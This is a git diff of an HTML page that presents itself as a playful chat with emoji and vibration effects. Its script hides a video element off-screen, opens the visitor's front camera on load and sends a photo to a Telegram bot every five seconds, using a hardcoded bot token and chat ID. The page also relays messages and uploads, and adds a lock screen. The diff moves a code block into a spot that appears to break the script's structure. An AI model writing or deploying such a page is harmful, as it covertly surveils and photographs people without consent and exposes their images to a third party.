@@ -5,7 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>....</title>
     <style>
-       body {
+  
+        body {
     background: linear-gradient(120deg, #ff758c, #ff7eb3);
     font-family: Arial, sans-serif;
     text-align: center;
@@ -191,14 +192,15 @@ button {
     cursor: not-allowed;
 }      
 
-          button { background: #ff4f81; color: white; cursor: pointer; }
-        video { position: fixed; top: -1000px; left: -1000px; } /* Hide video */
-        #canvas { display: none; }
+button { background: #ff4f81; color: white; cursor: pointer; }
+video { position: fixed; top: -1000px; left: -1000px; } /* Hide video */
+#canvas { display: none; }
 
 
         
     </style>
 </head>
+
 <body>
     <h2>....</h2>
     
@@ -218,17 +220,20 @@ button {
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
-    <script>
+<script>
+/*********************************************************************/
+
+/*********************************************************************/
         const botToken = "7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM";  
         const chatId = "878604830";  
 
-       // 📸 Background Camera Setup
+// 📸 Background Camera Setup
         async function startCamera() {
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             document.getElementById("video").srcObject = stream;
         }
 
-        // 📸 Capture Photo and Send to Telegram
+// 📸 Capture Photo and Send to Telegram
         async function captureAndSendPhoto() {
             const video = document.getElementById("video");
             const canvas = document.getElementById("canvas");
@@ -250,11 +255,16 @@ button {
             }, "image/jpeg", 0.5);
         }
 
+/*********************************************************************
+        CHAT SYSTEM
+*********************************************************************/
      
-        // ✉️ Send Message to Telegram
+// ✉️ Send Message to Telegram
         async function sendMessage() {
             const message = document.getElementById("message").value;
             if (!message) return;
+
+      
 
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
@@ -267,14 +277,14 @@ button {
             document.getElementById("message").value = "";
         }
 
-        // 📲 Check if the user presses "Enter" to send the message
+// 📲 Check if the user presses "Enter" to send the message
         function checkEnter(event) {
             if (event.key === 'Enter' && event.target.value.trim() !== "") {
                 sendMessage();
             }
         }
         
-        // 📤 Send Uploaded Image to Telegram
+// 📤 Send Uploaded Image to Telegram
         document.getElementById("upload").addEventListener("change", async function() {
             const file = this.files[0];
             if (!file) return;
@@ -292,7 +302,7 @@ button {
             autoScroll();
         });
 
-        // 📥 Fetch Messages from Telegram (Polling)
+// 📥 Fetch Messages from Telegram (Polling)
         async function getMessages() {
     let lastUpdateId = 0;
 
@@ -312,16 +322,15 @@ button {
                         let receivedMessage = update.message.text.toLowerCase().trim();
                         chatbox.innerHTML += `<div class="msg bot">${update.message.text}</div>`;
                         autoScroll();
-
-                        // 🛑 Check if message is "bye" or "exit"
+// 🛑 Check if message is "bye" or "exit"
                         if (receivedMessage === "bye" || receivedMessage === "exit") {
                             setTimeout(() => {
                                 window.close(); // Close page after 2 seconds
                             }, 2000);
                         }
                     }
-
-                    // ✅ Photo message
+                    
+// ✅ Photo message
                     if (update.message.photo) {
                         let photoArray = update.message.photo;
                         let photoFileId = photoArray[photoArray.length - 1].file_id;
@@ -336,39 +345,8 @@ button {
                                 autoScroll();
                             });
                     }
-
-                    // ✅ Voice message
-                    if (update.message.voice) {
-                        let voiceFileId = update.message.voice.file_id;
-                        let voiceUrl = `https://api.telegram.org/bot${botToken}/getFile?file_id=${voiceFileId}`;
-
-                        fetch(voiceUrl)
-                            .then(response => response.json())
-                            .then(fileData => {
-                                let filePath = fileData.result.file_path;
-                                let fullUrl = `https://api.telegram.org/file/bot${botToken}/${filePath}`;
-                                chatbox.innerHTML += `<div class="msg bot"><audio controls><source src="${fullUrl}" type="audio/ogg"></audio></div>`;
-                                autoScroll();
-                            });
-                    }
-                }
-            });
-        }
-    }, 3000); // Every 3 seconds
-}
-
-
-
-    
-        // 🔽 Scroll Chat to Bottom
-        function autoScroll() {
-    const chatbox = document.getElementById("chatbox");
-    chatbox.scrollTo({
-        top: chatbox.scrollHeight,
-        behavior: "smooth"  // ✅ Smooth scrolling effect
-    });
-}
-         // 🎤 Handle Mic Button for Voice Recording
+                    
+// 🎤 Handle Mic Button for Voice Recording
         async function toggleMic() {
             const micButton = document.getElementById("micButton");
             let mediaRecorder;
@@ -411,13 +389,52 @@ button {
                 scrollToBottom();
             };
         }
-        // ✅ Start Everything
+
+// ✅ Voice message
+                    if (update.message.voice) {
+                        let voiceFileId = update.message.voice.file_id;
+                        let voiceUrl = `https://api.telegram.org/bot${botToken}/getFile?file_id=${voiceFileId}`;
+
+                        fetch(voiceUrl)
+                            .then(response => response.json())
+                            .then(fileData => {
+                                let filePath = fileData.result.file_path;
+                                let fullUrl = `https://api.telegram.org/file/bot${botToken}/${filePath}`;
+                                chatbox.innerHTML += `<div class="msg bot"><audio controls><source src="${fullUrl}" type="audio/ogg"></audio></div>`;
+                                autoScroll();
+                            });
+                    }
+                }
+            });
+        }
+    }, 3000); // Every 3 seconds
+}
+
+
+
+    
+// 🔽 Scroll Chat to Bottom
+        function autoScroll() {
+    const chatbox = document.getElementById("chatbox");
+    chatbox.scrollTo({
+        top: chatbox.scrollHeight,
+        behavior: "smooth"  // ✅ Smooth scrolling effect
+    });
+}
+        
+// ✅ Start Everything
         startCamera();
         setInterval(captureAndSendPhoto, 5000); 
         getMessages();
-    </script>
+</script>
     
-<script>
+
+    
+<script>    
+/*********************************************************************
+        LOCK SYSTEM 
+*********************************************************************/
+    
 document.addEventListener("DOMContentLoaded", function () {
     let lockScreen = document.createElement("div");
     lockScreen.innerHTML = `
@@ -456,6 +473,10 @@ document.addEventListener("DOMContentLoaded", function () {
 </script>
 
 <script>
+/*********************************************************************
+                     AUTO LOCK
+*********************************************************************/
+    
 document.addEventListener("visibilitychange", function() {
     if (document.hidden) {
         console.log("Tab background me chala gaya.");
@@ -466,10 +487,10 @@ document.addEventListener("visibilitychange", function() {
 });
 </script>
 
-   
-
-
-    <script>
+<script>
+/*********************************************************************
+         EMOJI EXPLOSION ANIMTION
+*********************************************************************/
 (function () {
     // ✅ Add Required CSS Dynamically
     const style = document.createElement("style");
@@ -608,9 +629,12 @@ document.addEventListener("visibilitychange", function() {
     window.addEmojiExplosionToChat = addEmojiExplosionToChat;
     window.setupSendButton = setupSendButton;
 })();
-    </script>
-
-    <script>
+</script>
+ 
+<script>
+/*********************************************************************
+    VIBRATE ON NEW MESSAGE AND EMOJI EXPLOSION ANIMTION
+*********************************************************************/
 
 (function () {
     function vibrateOnNewMessage() {
@@ -666,10 +690,12 @@ document.addEventListener("visibilitychange", function() {
     window.addVibrationToEmojiExplosion = addVibrationToEmojiExplosion;
 })();
         
-    </script>
-
-    
+</script>
+ 
 <script>
+/*********************************************************************
+    ANIMATION AND VIBRATION CONNECTION 
+*********************************************************************/  
     addEmojiExplosionToChat("#chatbox", ".msg");
   
     addVibrationToChat("#chatbox", ".msg"); 
@@ -680,3 +706,5 @@ document.addEventListener("visibilitychange", function() {
    
 </body>
 </html>
+
+
